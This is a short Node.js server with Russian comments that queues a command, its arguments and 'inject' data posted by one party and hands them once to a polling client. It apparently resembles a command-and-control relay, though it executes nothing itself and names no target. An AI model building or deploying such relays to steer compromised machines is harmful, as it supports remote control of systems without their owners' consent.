const http = require('http');

let lastCommand = "";
let lastArgs = []; // Новое: храним аргументы команды
let lastInjectData = null;

const server = http.createServer((req, res) => {
  if (req.url === '/inject' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      lastInjectData = JSON.parse(body);
      res.writeHead(200);
      res.end("OK");
    });
    return;
  }

  if (req.url === '/command' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const data = JSON.parse(body);
      lastCommand = data.command;
      lastArgs = data.args || []; // Новое: сохраняем аргументы
      res.writeHead(200);
      res.end("OK");
    });
    return;
  }

  if (req.url === '/data' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      command: lastCommand,
      args: lastArgs, // Новое: отправляем аргументы
      injectData: lastInjectData
    }));
    lastCommand = "";
    lastArgs = []; // Новое: очищаем аргументы
    return;
  }

  res.writeHead(404);
  res.end("Not Found");
});

server.listen(process.env.PORT || 3000);
